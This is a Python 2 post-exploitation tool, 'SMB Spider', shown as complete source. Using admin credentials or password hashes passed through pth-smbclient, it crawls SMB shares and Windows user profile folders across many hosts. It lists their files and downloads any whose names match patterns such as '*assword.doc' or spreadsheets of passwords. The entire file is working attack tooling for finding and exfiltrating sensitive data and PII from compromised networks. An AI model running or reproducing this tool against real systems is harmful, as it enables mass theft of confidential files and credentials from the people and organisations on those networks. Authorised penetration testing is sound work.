#!/usr/bin/python

#
# This post-exploitation script can be used to spider numerous systems
# to identify sensitive and/or confidential data. A good scenario to 
# use this script is when you have admin credentials to tons of 
# Windows systems, and you want to look for files containing data such 
# as PII, network password documents, etc. For the most part,
# this script uses smbclient, parses the results, and prints
# out the results in a nice format for you.
#
# Author: Alton Johnson
# Contact: alton.jx@gmail.com
# Version: 2.4
# Updated: 01/23/2014
#

import commands, time, getopt, re, os
from sys import argv

start_time = time.time()

class colors:
	red = "\033[1;31m"
	blue = "\033[1;34m"
	norm = "\033[0;00m"
	green = "\033[1;32m"

banner = "\n " + "*" * 56
banner += "\n *     		        _     				*"
banner += "\n *    		       | |       //  \\\\			* "
banner += "\n *	  ___ _ __ ___ | |__    _\\\\()//_		*"
banner += "\n *	 / __| '_ ` _ \| '_ \  / //  \\\\ \ 		*"
banner += "\n *	 \__ \ | | | | | |_) |   |\__/|			*"
banner += "\n *	 |___/_| |_| |_|_.__/				*"
banner += "\n *							*"
banner += "\n * SMB Spider v2.4, Alton Johnson (alton.jx@gmail.com) 	*"
banner += "\n " + "*" * 56 + "\n"

def help():
	print banner
	print " Usage: %s <OPTIONS>" % argv[0]
	print colors.red + "\n Target(s) (required): \n" + colors.norm
	print "\t -h <host>\t Provide IP address or a text file containing IPs."
	print "\t\t\t Supported formats: IP, smb://ip/share, \\\\ip\\share\\"
	print colors.red + "\n Credentials (required): \n" + colors.norm
	print "\t -u <user>\t Specify a valid username to authenticate to the system(s)."
	print "\t -p <pass>\t Specify the password which goes with the username."
	print "\t -P <hash>\t Use -P to provide password hash if cleartext password isn't known."
	print "\t -d <domain>\t If using a domain account, provide domain name."
	print colors.green + "\n Shares (optional):\n" + colors.norm
	print "\t -s <share>\t Specify shares (separate by comma) or specify \"profile\" to spider user profiles."
	print "\t -f <file>\t Specify a list of shares from a file."
	print colors.green + "\n Other (optional):\n" + colors.norm
	print "\t -w \t\t Avoid verbose output. Output successful spider results to smbspider_host_share_user.txt."
	print "\t\t\t This option is HIGHLY recommended if numerous systems are being scanned."
	print "\t -n \t\t ** Ignore authentication check prior to spidering."
	print "\t -g <file> \t Grab (download) files that match strings provided in text file. (Case sensitive.)"
	print "\t\t\t ** Examples: *assword.doc, *assw*.doc, pass*.xls, etc."
	print colors.norm
	exit()

def start(argv):
	if len(argv) < 1:
		help()
	try:
		opts, args = getopt.getopt(argv, "u:p:d:h:s:f:P:wng:")
	except getopt.GetoptError, err:
		print colors.red + "\n  [-] Error: " + str(err) + colors.norm
	
	# set default variables to prevent errors later in script
	sensitive_strings = []
	smb_user = ""
	smb_pass = ""
	smb_domain = ""
	smb_host = []
	smb_share = ["profile"]
	pth = False
	output = False
	unique_systems = []
	ignorecheck = False
	inputfile = False

	#parse through arguments
	for opt, arg in opts:
		if opt == "-u":
			smb_user = arg
		elif opt == "-p":
			smb_pass = arg
		elif opt == "-d":
			smb_domain = arg
		elif opt == "-h":
			try:
				smb_host = open(arg).read().split('\n')
				inputfile = True
			except:
				if "\\\\" in arg and "\\" not in arg[-1:]:
					test = arg[2:].replace("\\","\\")
					smb_host.append("\\\\%s\\" % test)
				else:
					smb_host.append(arg)
		elif opt == "-f":
			smb_share = open(arg).read().split()
		elif opt == "-s":
			smb_share = arg.split(',')
		elif opt == "-P":
			if arg[-3:] == ":::":
				arg = arg[:-3]
			smb_pass = arg
			pth = True
		elif opt == "-w":
			output = True
		elif opt == "-n":
			ignorecheck = True
		elif opt == "-g":
			sensitive_strings = open(arg).read().split("\n")[:-1]

	#check options before proceeding
	if (not smb_user or not smb_pass or not smb_host):
		print colors.red + "\n [-] " + colors.norm + "Error: Please check to ensure that all required options are provided."
		help()
	if pth:
		result = commands.getoutput("pth-smbclient")
		if "not found" in result.lower():
			print colors.red + "\n [-] " + colors.norm + "Error: The passing-the-hash package was not found. Therefore, you cannot pass hashes."
			print "Please run \"apt-get install passing-the-hash\" to fix this error and try running the script again.\n"
			exit()

	#make smb_domain, smb_user, and smb_pass one variable
	if smb_domain:
		credentials = smb_domain + "\\\\" + smb_user + " " + smb_pass
	else:
		credentials = smb_user + " " + smb_pass
	for system in smb_host:
		if "\\" in system or "//" in system:
			if "\\" in system:
				sys = system[system.find("\\")+2:]
				sys = sys[:sys.find("\\")]
			else:
				sys = system[system.find("/")+2:]
				sys = sys[:sys.find("/")]
			if sys not in unique_systems:
				unique_systems.append(sys)
		else:
			unique_systems.append(system)
	#start spidering
	print banner
	unique_systems = [i for i in unique_systems if i != ''] #remove blank elements from list
	print " [*] Spidering %s system(s)..." % len(unique_systems)
	begin = spider(credentials, smb_host, smb_share, pth, output, ignorecheck, inputfile, sensitive_strings)
	begin.start_spidering()

class spider:
	def __init__(self, credentials, hosts, shares, pth, output, ignorecheck, inputfile, sensitive_strings):
		self.list_of_hosts = hosts
		self.list_of_shares = shares
		self.credentials = credentials
		self.smb_host = ""
		self.smb_share = ""
		self.skip_host = ""
		self.pth = pth
		self.outputfile = output
		self.blacklisted = []
		self.ignorecheck = ignorecheck
		self.inputfile = inputfile
		self.smb_download = True
		self.file_locations = []
		self.sensitive_strings = sensitive_strings
		self.profile = False
	
	def start_spidering(self):
		share = ""
		self.total_hosts = 0
		empty_share_error = colors.red + " [-] " + colors.norm + "Error: Empty share detected for host %s. Skipping share."
		for test_host in self.list_of_hosts:
			temp = test_host
			if ("//" in temp or "\\\\" in temp) and self.list_of_shares[0] != "profile":
				print colors.red + " [-] " + colors.norm + "Error: You cannot specify a share if your target(s) contains \\\\<ip>\\<share> or //<ip>/<share>\n"
				exit()
		for host in self.list_of_hosts:
			self.total_hosts += 1
			tmp_share = host.replace("/","")
			tmp_share = host.replace("\\","")
			orig_host = host # ensures that we can check the original host value later on if we need to
			if "\\\\" in host: # this checks to see if host is in the format of something like \\192.168.0.1\C$
				host = host[2:]
				host = host[:host.find("\\")]
			elif "smb://" in host: # this checks to see if the host contains a format such as smb://192.168.0.1/C$
				host = host[6:]
				host = host[:host.find("/")]
			if self.skip_host == host:
				self.blacklisted.append(host)
				continue
			if len(self.list_of_shares) == 1 and ("//" in orig_host or "\\\\" in orig_host):
				if "//" in orig_host:
					share = orig_host[orig_host.rfind("/")+1:]
				elif "\\\\" in orig_host:
					if orig_host[-1] == "\\":
						temp = orig_host[:-1]
						share = temp[temp.rfind("\\")+1:]
				self.smb_host = host
				self.smb_share = share
			else:
				for share in self.list_of_shares:
					if self.skip_host == host:
						self.blacklisted.append(host)
						break
					self.smb_host = host
					self.smb_share = share
			tmp_share = tmp_share.replace(self.smb_host,"")
			tmp_share = tmp_share.replace("smb:///","")
			if len(tmp_share) == 0 and (self.smb_share != "profile" and len(self.smb_share) == 0):
				print empty_share_error % self.smb_host
				continue
			if len(self.list_of_shares) > 1:
				for x in self.list_of_shares:
					self.smb_share = x
					print "\n [*] Attempting to spider smb://%s/%s" % (self.smb_host, self.smb_share.replace("profile","<user profiles>"))
					self.spider_host()
			else:
				print "\n [*] Attempting to spider smb://%s/%s " % (self.smb_host, self.smb_share.replace("profile","<user profiles>"))
				self.spider_host()
			if self.list_of_shares[0] == "profile":
				if self.inputfile:
					print " [*] Finished with smb://%s/<user profiles>. [Remaining: %s] " % (self.smb_host, str(len(self.list_of_hosts)-self.total_hosts-1))
				else:
					print " [*] Finished with smb://%s/<user profiles>. [Remaining: %s] " % (self.smb_host, str(len(self.list_of_hosts)-self.total_hosts))
			else:
				print " [*] Finished with smb://%s/%s. [Remaining: %s] " % (self.smb_host, self.smb_share, str(len(self.list_of_hosts)-self.total_hosts))
		if self.smb_download: self.start_downloading()
	
	def start_downloading(self):
		if len(self.sensitive_strings) == 0: return
		print "\n" + colors.blue + " [*] " + colors.norm + "Attempting to download files that were deemed sensitive."
		if not os.path.exists('smbspider-downloads'):
			os.makedirs('smbspider-downloads')
		for f in self.file_locations:
			host = f[2:]
			host = str(host[:host.find("\\")])
			share = f[len(host)+3:]
			share = share[:share.find("\\")]
			full_path = f.replace("\\\\%s\\%s\\" % (host, share), "").strip()
			file_name = full_path[full_path.rfind("\\")+1:]
			for s in self.sensitive_strings:
				if s in file_name:
					result = commands.getoutput("%s -c \"get \\\"%s\\\" \\\"%s_%s\\\"\" //%s/%s -U %s " %  (self.smbclient(), full_path.replace("\\","\\\\"), \
					host,file_name, host, share, self.credentials))
					print colors.blue + " [*] " + colors.norm + "Downloaded: %s from smb://%s/%s" % (file_name, host, share)
					commands.getoutput("mv \"%s_%s\" \"smbspider-downloads/%s\"" % (host, file_name, host, file_name))
				else:
					temp_file =  s.split("*")
					all_match = 0
					for tmp in temp_file:
						if tmp in full_path:
							all_match = 1
						else:
							all_match = 0
							break
					if all_match == 1:
						result = commands.getoutput("%s -c \"get \\\"%s\\\" \\\"%s_%s\\\"\" //%s/%s -U %s " %  (self.smbclient(), full_path.replace("\\","\\\\"), \
						host,file_name, host, share, self.credentials))
						print colors.blue + " [*] " + colors.norm + "Downloaded: %s from smb://%s/%s" % (file_name, host, share)
						commands.getoutput("mv \"%s_%s\" \"smbspider-downloads/%s_%s\"" % (host, file_name, host, file_name))
		
	def parse_result(self, result):
		############################################################
		# this small section removes all of the unnecessary crap. a bit ugly, i know! :x
		errors = ["O_SUCH_F","ACCESS_DEN",
"US_OBJECT_NAME_IN", "US_INVALID_NETWORK_RE", "CT_NAME_NOT",
"not present","CONNECTION_REFUSED"
	]
		result = result.split('\n')
		purge = []
		trash = ["  .  ", "  ..  ", "Domain=", "    D", "blocks of size",
"wrapper called", "Substituting user supplied"]
		for num in range(0,len(result)):
			for d in trash:
				if d in result[num] or len(result[num]) < 2:
					purge.append(num)
		purge = list(set(purge))
		purge = sorted(purge, reverse=True)
		for i in purge:
			del result[i]	
		############################################################
		directory = ""
		filename = ""
		file_locations = []
		file_change = False
		for x in result:
			if x[0] == "\\":
				directory = x
				file_change = False
			else:
				filename = x[2:]
				filename = filename[:filename.find("    ")]
				file_change = True
			fail = 0
			if not file_change: continue
			for error in errors:
				if error in filename:
					fail = 1
			if fail == 0 and len(filename) > 0:
				if not self.outputfile:
					file_complete_path = "\\\\%s\%s" % (self.smb_host,self.smb_share) + directory + "\\" + filename
					print colors.blue + " [*] " + colors.norm + file_complete_path
				else:
					if not os.path.exists('smbspider'):
						os.makedirs('smbspider')
					
					if self.profile:
						lawl_share = "profile"
					else:
						lawl_share = self.smb_share
					output = open("smbspider/smbspider_%s_%s_%s.txt" % (self.smb_host, lawl_share, self.credentials.split()[0]), 'a')
					file_complete_path = colors.blue + " [*] " + colors.norm + "\\\\%s\%s" % (self.smb_host,lawl_share) + directory + "\\" + filename + "\n"
					output.write(file_complete_path)
					output.close()
				if self.smb_download:
					self.file_locations.append(file_complete_path[file_complete_path.find("\\\\"):])

	def fingerprint_fs(self):
		result = commands.getoutput("%s -c \"ls Users\\*\" //%s/C$ -U %s" % (self.smbclient(), self.smb_host, self.credentials)).split()
		if self.check_errors(result[-1]):
			return "error"
		if "NT_STATUS_OBJECT_NAME_NOT_FOUND" in result:
			return "old"
		else:
			return "new"

	def find_users(self, result):
		result = result.split('\n')
		purge = []
		users = []
		for num in range(0,len(result)): # cleans some stuff up a bit.
			if "  .  " in result[num] or "  ..  " in result[num] or "Domain=" in result[num]\
	 or len(result[num]) < 2 or "blocks of size" in result[num]:
				purge.append(num)
		purge = sorted(purge, reverse=True)
		for i in purge:
			del result[i]

		#clean up users list a little bit
		for i in result:
			user = i[:i.find("   D")]
			user = user[2:user.rfind(re.sub(r'\W+', '', user)[-1])+1]
			users.append(user)
		return users
	
	def check_errors(self, result):
		access_error = {
"UNREACHABLE":" [-] Error [%s]: Check to ensure that host is online and that share is accessible." % self.smb_host,
"UNSUCCESSFUL":" [-] Error [%s]: Check to ensure that host is online and that share is accessible." % self.smb_host,
"TIMEOUT":" [-] Error [%s]: Check to ensure that host is online and that share is accessible." % self.smb_host,
"LOGON_SERVER":" [-] Error %s Cannot contact logon server. Skipping host." % self.smb_host
}
		for err in access_error:
			if err in result:
				print colors.red + access_error[err] + colors.norm
				self.skip_host = self.smb_host
				return True
		
		
		if "LOGON_FAIL" in result.split()[-1] and not self.ignorecheck:
			print colors.red + " [-] " + colors.norm + "Error [%s]: Invalid credentials. Please correct credentials and try again." % self.smb_host
			exit()
		elif "ACCESS_DENIED" in result.split()[-1]:
			print colors.red + " [-] " + colors.norm + "Error [%s]: Valid credentials, but no access. Try another account." % self.smb_host
		elif "BAD_NETWORK" in result.split()[-1] or "CONNECTION_REFUSED" in result.split()[-1]:
			print colors.red + " [-] " + colors.norm + "Error: Invalid share -> smb://%s/%s" % (self.smb_host,self.smb_share)
			return True

		
	def smbclient(self):
		if self.pth:
			return "pth-smbclient"
		else:
			return "smbclient"
	
	def spider_host(self):
		if self.smb_share.lower() == "profile":
			self.smb_share = "C$"
			self.profile = True
			if self.fingerprint_fs() == "error":
				return
			elif self.fingerprint_fs() == "old":
				folders = ['My Documents','Desktop','Documents']
				result = commands.getoutput("%s -c \"ls \\\"Documents and Settings\\*\" //%s/C$ -U %s" % (self.smbclient(), self.smb_host, self.credentials))
				if self.check_errors(result):
					return
				users = self.find_users(result)
				for user in users:
					for folder in folders:
						result = commands.getoutput("%s -c \"recurse;ls \\\"Documents and Settings\\%s\\%s\" //%s/C$ -U %s"\
	 % (self.smbclient(), user, folder, self.smb_host, self.credentials))
						self.parse_result(result)
			else:
				folders = ['Documents','Desktop','Music','Videos','Downloads','Pictures']
				result = commands.getoutput("%s -c \"ls \\\"Users\\*\" //%s/C$ -U %s" % (self.smbclient(), self.smb_host, self.credentials))
				if self.check_errors(result):
					return
				users = self.find_users(result)
				for user in users:
					for folder in folders:
						result = commands.getoutput("%s -c \"recurse;ls \\\"Users\\%s\\%s\" //%s/C$ -U %s" % (self.smbclient(), user, folder, self.smb_host, self.credentials))
						self.parse_result(result)
		else:
			result = commands.getoutput("%s -c \"recurse;ls\" \"//%s/%s\" -U %s" % (self.smbclient(), self.smb_host, self.smb_share, self.credentials))
			if self.check_errors(result):
				return
			self.parse_result(result)

if __name__ == "__main__":
	try:
		start(argv[1:])
	except KeyboardInterrupt:
		print "\nExiting. Interrupted by user (ctrl-c)."
		exit()
	except Exception, err:
		print err
		exit()

print "\n-----"
print "Completed in: %.1fs" % (time.time() - start_time)
